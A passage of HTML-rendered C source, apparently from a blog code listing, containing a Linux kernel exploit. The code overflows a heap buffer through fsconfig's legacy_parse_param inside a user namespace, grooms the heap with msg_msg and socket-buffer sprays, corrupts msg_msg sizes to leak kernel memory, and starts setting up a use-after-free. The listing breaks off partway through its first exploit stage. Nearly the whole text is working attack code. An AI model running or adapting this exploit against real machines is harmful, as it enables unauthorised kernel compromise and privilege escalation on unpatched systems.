class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sched.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/ipc.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/msg.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef __NR_fsconfig</span><br><span class="line">#define __NR_fsconfig 431</span><br><span class="line">#endif</span><br><span class="line">#ifndef __NR_fsopen</span><br><span class="line">#define __NR_fsopen 430</span><br><span class="line">#endif</span><br><span class="line">#define FSCONFIG_SET_STRING 1</span><br><span class="line">#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)</span><br><span class="line">#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)</span><br><span class="line">#ifndef PAGE_SIZE</span><br><span class="line">#define PAGE_SIZE 4096</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#define logd(fmt, ...) fprintf(stderr, (fmt), ##__VA_ARGS__)</span><br><span class="line">#define NUM_MSQIDS_1 (0x400)</span><br><span class="line">#define NUM_MSQIDS_2 (0x400)</span><br><span class="line">#define MSG_A_RAW_SIZE (0x1400 - 0x8)</span><br><span class="line">#define MSG_A_BUFF_SIZE (MSG_A_RAW_SIZE - sizeof(struct msg_msg))</span><br><span class="line">#define MSG_B_RAW_SIZE (0x400)</span><br><span class="line">#define MSG_B_BUFF_SIZE (MSG_B_RAW_SIZE - sizeof(struct msg_msg))</span><br><span class="line">#define MTYPE_A (0x41)</span><br><span class="line">#define MTYPE_B (0x42)</span><br><span class="line">#define MTYPE_FAKE (0x43)</span><br><span class="line">#define MSG_SIG (0x13371337)</span><br><span class="line">#define NUM_PIPES (0x100)</span><br><span class="line">#define NUM_SOCKETS (4)</span><br><span class="line">#define NUM_SKBUFFS (0x80)</span><br><span class="line"></span><br><span class="line">struct list_head &#123;</span><br><span class="line">    uint64_t next;</span><br><span class="line">    uint64_t prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct msg_msg &#123;</span><br><span class="line">    struct list_head m_list;</span><br><span class="line">    uint64_t m_type;</span><br><span class="line">    uint64_t m_ts;</span><br><span class="line">    uint64_t next;</span><br><span class="line">    uint64_t security;</span><br><span class="line">    char mtext[0];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct msg_msgseg &#123;</span><br><span class="line">    uint64_t next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct typ_msg_a &#123;</span><br><span class="line">    long mtype;</span><br><span class="line">    char mtext[MSG_A_BUFF_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct typ_msg_a_oob &#123;</span><br><span class="line">    long mtype;</span><br><span class="line">    char mtext[MSG_A_BUFF_SIZE + 0x400];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct typ_msg_b &#123;</span><br><span class="line">    long mtype;</span><br><span class="line">    char mtext[MSG_B_BUFF_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int sockfd;</span><br><span class="line">int sock_pairs[NUM_SOCKETS][2];</span><br><span class="line">int msqid_1[NUM_MSQIDS_1];</span><br><span class="line">int msqid_2[NUM_MSQIDS_2];</span><br><span class="line">struct typ_msg_a msg_a = &#123;0&#125;;</span><br><span class="line">struct typ_msg_a_oob msg_a_oob = &#123;0&#125;;</span><br><span class="line">struct typ_msg_b msg_b = &#123;0&#125;;</span><br><span class="line">int list1_corrupted_msqid = -1;</span><br><span class="line">int list2_leak_msqid = -1;</span><br><span class="line">int list2_leak_mtype = 0;</span><br><span class="line">uint64_t list2_uaf_msg_addr = 0;</span><br><span class="line">int list2_uaf_mtype = 0;</span><br><span class="line">uint64_t heap_buffer_addr = 0;</span><br><span class="line">int dummy_pipe[NUM_PIPES][2];</span><br><span class="line"></span><br><span class="line">void z() &#123;</span><br><span class="line">    logd(&quot;waiting...\n&quot;);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void die() &#123;</span><br><span class="line">    exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hexdump(const void *data, size_t size) &#123;</span><br><span class="line">    char ascii[17];</span><br><span class="line">    size_t i, j;</span><br><span class="line">    ascii[16] = &#x27;\0&#x27;;</span><br><span class="line">    for (i = 0; i &lt; size; ++i) &#123;</span><br><span class="line">        logd(&quot;%02X &quot;, ((unsigned char *)data)[i]);</span><br><span class="line">        if (((unsigned char *)data)[i] &gt;= &#x27; &#x27; &amp;&amp; ((unsigned char *)data)[i] &lt;= &#x27;~&#x27;) &#123;</span><br><span class="line">            ascii[i % 16] = ((unsigned char *)data)[i];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            ascii[i % 16] = &#x27;.&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        if ((i + 1) % 8 == 0 || i + 1 == size) &#123;</span><br><span class="line">            logd(&quot; &quot;);</span><br><span class="line">            if ((i + 1) % 16 == 0) &#123;</span><br><span class="line">                logd(&quot;|  %s \n&quot;, ascii);</span><br><span class="line">            &#125; else if (i + 1 == size) &#123;</span><br><span class="line">                ascii[(i + 1) % 16] = &#x27;\0&#x27;;</span><br><span class="line">                if ((i + 1) % 16 &lt;= 8) &#123;</span><br><span class="line">                    logd(&quot; &quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                for (j = (i + 1) % 16; j &lt; 16; ++j) &#123;</span><br><span class="line">                    logd(&quot;   &quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                logd(&quot;|  %s \n&quot;, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void init_unshare() &#123;</span><br><span class="line">    int fd;</span><br><span class="line">    char buff[0x100];</span><br><span class="line"></span><br><span class="line">    // strace from `unshare -Ur xxx`</span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER);</span><br><span class="line"></span><br><span class="line">    fd = open(&quot;/proc/self/setgroups&quot;, O_WRONLY);</span><br><span class="line">    snprintf(buff, sizeof(buff), &quot;deny&quot;);</span><br><span class="line">    write(fd, buff, strlen(buff));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    fd = open(&quot;/proc/self/uid_map&quot;, O_WRONLY);</span><br><span class="line">    snprintf(buff, sizeof(buff), &quot;0 %d 1&quot;, getuid());</span><br><span class="line">    write(fd, buff, strlen(buff));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    fd = open(&quot;/proc/self/gid_map&quot;, O_WRONLY);</span><br><span class="line">    snprintf(buff, sizeof(buff), &quot;0 %d 1&quot;, getgid());</span><br><span class="line">    write(fd, buff, strlen(buff));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void init_msq() &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);</span><br><span class="line">        if (msqid_1[i] &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] msgget() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_2; i++) &#123;</span><br><span class="line">        msqid_2[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);</span><br><span class="line">        if (msqid_2[i] &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] msgget() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void init_sock() &#123;</span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    if (sockfd &lt; 0) &#123;</span><br><span class="line">        logd(&quot;[-] socket() fail\n&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_pairs[i]) &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] socketpair() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void clean_msq_1() &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        msgrcv(msqid_1[i], &amp;msg_a, sizeof(msg_a.mtext), MTYPE_A, IPC_NOWAIT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void clean_msq_2() &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_2; i++) &#123;</span><br><span class="line">        for (int j = 0; j &lt; 0x10; j++) &#123;</span><br><span class="line">            msgrcv(msqid_2[i], &amp;msg_b, sizeof(msg_b.mtext), MTYPE_B | (j &lt;&lt; 8), IPC_NOWAIT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void clean_pipe() &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">        char buffer[0x100];</span><br><span class="line">        read(dummy_pipe[i][0], buffer, 0x100);</span><br><span class="line">        close(dummy_pipe[i][0]);</span><br><span class="line">        close(dummy_pipe[i][1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void bind_cpu() &#123;</span><br><span class="line">    cpu_set_t my_set;</span><br><span class="line">    CPU_ZERO(&amp;my_set);</span><br><span class="line">    CPU_SET(0, &amp;my_set);</span><br><span class="line">    if (sched_setaffinity(0, sizeof(cpu_set_t), &amp;my_set)) &#123;</span><br><span class="line">        perror(&quot;sched_setaffinity&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int call_fsopen() &#123;</span><br><span class="line">    int fd = fsopen(&quot;ext4&quot;, 0);</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        perror(&quot;fsopen&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    return fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void spray_skbuff_data(void *ptr, size_t size) &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">        for (int j = 0; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">            if (write(sock_pairs[i][0], ptr, size) &lt; 0) &#123;</span><br><span class="line">                logd(&quot;[-] write to sock pairs failed\n&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void free_skbuff_data(void *ptr, size_t size) &#123;</span><br><span class="line">    for (int i = 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">        for (int j = 0; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">            if (read(sock_pairs[i][1], ptr, size) &lt; 0) &#123;</span><br><span class="line">                logd(&quot;[-] read from sock pairs failed\n&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t exploit_step1(int fd) &#123;</span><br><span class="line">    char buff[0x1000];</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * padding ctx-&gt;legacy_data to</span><br><span class="line">     * ------</span><br><span class="line">     * 0x0FE0: BBBB BBBB - BBBB BBBB</span><br><span class="line">     * 0x0FF0: BBBB BBBB - BBBB BBB?</span><br><span class="line">     * 0x1000: ???? ???? - ???? ????</span><br><span class="line">     *</span><br><span class="line">     * so next write will overwrite next page,</span><br><span class="line">     * ------</span><br><span class="line">     * 0x0FF0: BBBB BBBB - BBBB BBB,</span><br><span class="line">     * 0x1000: =XXX XXXX - XXXX XXXX</span><br><span class="line">     */</span><br><span class="line">    logd(&quot;[*] prepare fsconfig heap overflow\n&quot;);</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    memset(buff, &#x27;A&#x27;, 0x100 - 2);</span><br><span class="line">    for (int i = 0; i &lt; 0xf; i++) &#123;</span><br><span class="line">        fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, buff, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    memset(buff, &#x27;B&#x27;, 0x100 - 3);</span><br><span class="line">    fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, buff, 0);</span><br><span class="line"></span><br><span class="line">    // alloc msg_msg with 0x1000(-0x30) body and 0x400(-0x08) msg_msgseg</span><br><span class="line">    logd(&quot;[*] sparying msg_msg ...\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        memset(&amp;msg_a, 0, sizeof(msg_a));</span><br><span class="line">        msg_a.mtype = MTYPE_A;</span><br><span class="line">        memset(msg_a.mtext, &#x27;Q&#x27;, sizeof(msg_a.mtext));</span><br><span class="line">        ((int *)&amp;msg_a.mtext)[0] = MSG_SIG;</span><br><span class="line">        ((int *)&amp;msg_a.mtext)[1] = i;</span><br><span class="line">        if (msgsnd(msqid_1[i], &amp;msg_a, sizeof(msg_a.mtext), 0) &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] msgsnd() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // trigger oob write to overwrite msg_msg.m_ts (hopes)</span><br><span class="line">    logd(&quot;[*] trigger oob write in `legacy_parse_param` to corrupt msg_msg.m_ts\n&quot;);</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    strcat(buff, &quot;0000000&quot;);  // m_list.next</span><br><span class="line">    strcat(buff, &quot;11111111&quot;); // m_list.prev</span><br><span class="line">    strcat(buff, &quot;22222222&quot;); // m_type</span><br><span class="line">    uint64_t target_size = sizeof(msg_a_oob.mtext);</span><br><span class="line">    memcpy(buff + strlen(buff), &amp;target_size, 2);</span><br><span class="line">    fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, buff, 0);</span><br><span class="line"></span><br><span class="line">    // recv from buffer to see if leak success</span><br><span class="line">    logd(&quot;[*] search corrupted msg_msg ...\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        ssize_t copy_size = msgrcv(msqid_1[i], &amp;msg_a_oob, sizeof(msg_a_oob.mtext), 0, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">        if (copy_size &lt; 0) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        if (copy_size == sizeof(msg_a_oob.mtext)) &#123;</span><br><span class="line">            logd(&quot;[+] corrupted msg_msg found, id: %d\n&quot;, msqid_1[i]);</span><br><span class="line">            list1_corrupted_msqid = msqid_1[i];</span><br><span class="line">            msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);</span><br><span class="line">            uint64_t *oob_data = (uint64_t *)(msg_a_oob.mtext + sizeof(msg_a.mtext));</span><br><span class="line">            size_t oob_size = sizeof(msg_a_oob.mtext) - sizeof(msg_a.mtext);</span><br><span class="line">            if (memcmp(&amp;oob_data[1], &quot;QQQQQQQQ&quot;, 8)) &#123; // &#x27;QQQQQQQQ&#x27;</span><br><span class="line">                logd(&quot;[!] but the next object is not allocated by msg_msgseg\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (list1_corrupted_msqid &lt; 0) &#123;</span><br><span class="line">        logd(&quot;[!] can&#x27;t found corrupted msg_msg, and kernel may crash :(\n&quot;);</span><br><span class="line">        clean_msq_1();</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean uncorrupted msg_msg</span><br><span class="line">    logd(&quot;[*] clean unused msg_msg ...\n&quot;);</span><br><span class="line">    clean_msq_1();</span><br><span class="line"></span><br><span class="line">    // realloc 0x400 slab with msg_msg</span><br><span class="line">    logd(&quot;[*] alloc `struct msg_msg` to re-acquire the 0x400 slab freed by msg_msgseg ...\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_2; i++) &#123;</span><br><span class="line">        memset(&amp;msg_b, 0, sizeof(msg_b));</span><br><span class="line">        memset(msg_b.mtext, &#x27;W&#x27;, sizeof(msg_b.mtext));</span><br><span class="line">        ((int *)&amp;msg_b.mtext)[0] = MSG_SIG;</span><br><span class="line">        ((int *)&amp;msg_b.mtext)[1] = i;</span><br><span class="line">        for (int j = 0; j &lt; 0x10; j++) &#123;</span><br><span class="line">            msg_b.mtype = MTYPE_B | (j &lt;&lt; 8);</span><br><span class="line">            if (msgsnd(msqid_2[i], &amp;msg_b, sizeof(msg_b.mtext), 0) &lt; 0) &#123;</span><br><span class="line">                logd(&quot;[-] msgsnd() fail\n&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // hope leak happen</span><br><span class="line">    &#123;</span><br><span class="line">        ssize_t copy_size = msgrcv(list1_corrupted_msqid, &amp;msg_a_oob, sizeof(msg_a_oob.mtext), 0, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">        if ((copy_size &lt; 0) || (copy_size != sizeof(msg_a_oob.mtext))) &#123;</span><br><span class="line">            logd(&quot;[-] recv from corrupted msg_msg failed\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        uint64_t *oob_data = (uint64_t *)(msg_a_oob.mtext + sizeof(msg_a.mtext));</span><br><span class="line">        size_t oob_size = sizeof(msg_a_oob.mtext) - sizeof(msg_a.mtext);</span><br><span class="line">        struct msg_msg *p = (struct msg_msg *)oob_data;</span><br><span class="line">        if (((int *)&amp;p-&gt;mtext)[0] != MSG_SIG) &#123;</span><br><span class="line">            logd(&quot;[-] bad luck, we don&#x27;t catch 0x400 msg_msg\n&quot;);</span><br><span class="line">            clean_msq_2();</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        logd(&quot;[*] it works :)\n&quot;);</span><br><span class="line"></span><br><span class="line">        list2_leak_msqid = msqid_2[((int *)&amp;p-&gt;mtext)[1]];</span><br><span class="line">        list2_leak_mtype = p-&gt;m_type;</span><br><span class="line">        list2_uaf_msg_addr = p-&gt;m_list.prev;</span><br><span class="line">        list2_uaf_mtype = p-&gt;m_type - 0x0100;</span><br><span class="line">        msqid_2[((int *)&amp;p-&gt;mtext)[1]] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);</span><br><span class="line">        hexdump(msg_a_oob.mtext + sizeof(msg_a.mtext), 0x40);</span><br><span class="line">        logd(&quot;[+] leak list2_leak_msqid: %d\n&quot;, list2_leak_msqid);</span><br><span class="line">        logd(&quot;[+] leak list2_leak_mtype: 0x%x\n&quot;, list2_leak_mtype);</span><br><span class="line">        logd(&quot;[+] leak list2_uaf_msg_addr: 0x%lx\n&quot;, list2_uaf_msg_addr);</span><br><span class="line">        logd(&quot;[+] leak list2_uaf_mtype: 0x%x\n&quot;, list2_uaf_mtype);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] alloc msg_msg as heap buffer with known address\n&quot;);</span><br><span class="line">    &#123;</span><br><span class="line">        for (int j = ((list2_leak_mtype + 0x100) &gt;&gt; 8); j &lt; 0x10; j++) &#123;</span><br><span class="line">            msgrcv(list2_leak_msqid, &amp;msg_b, sizeof(msg_b.mtext), MTYPE_B | (j &lt;&lt; 8), IPC_NOWAIT);</span><br><span class="line">        &#125;</span><br><span class="line">        memset(buff, 0, sizeof(buff));</span><br><span class="line">        struct msg_msg *p = (struct msg_msg *)buff;</span><br><span class="line">        p-&gt;m_list.next = list2_uaf_msg_addr;</span><br><span class="line">        p-&gt;m_list.prev = 0xdeadbeefdeadbeef;</span><br><span class="line">        p-&gt;m_type = MTYPE_A;</span><br><span class="line"></span><br><span class="line">        uint64_t *p2;</span><br><span class="line"></span><br><span class="line">        // unlink next / prev</span><br><span class="line">        p2 = (uint64_t *)(buff + 0x80);</span><br><span class="line">        *p2++ = heap_buffer_addr; // +0x80</span><br><span class="line">        *p2++ = heap_buffer_addr; // +0x88</span><br><span class="line"></span><br><span class="line">        memset(&amp;msg_b, 0, sizeof(msg_b));</span><br><span class="line">        memcpy(msg_b.mtext, buff, sizeof(msg_b.mtext));</span><br><span class="line">        msg_b.mtype = MTYPE_B;</span><br><span class="line">        if (msgsnd(list2_leak_msqid, &amp;msg_b, sizeof(msg_b.mtext), 0) &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] msgsnd() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] fetch heap_buffer address by oob read again\n&quot;);</span><br><span class="line">    &#123;</span><br><span class="line">        ssize_t copy_size = msgrcv(list1_corrupted_msqid, &amp;msg_a_oob, sizeof(msg_a_oob.mtext), 0, MSG_COPY | 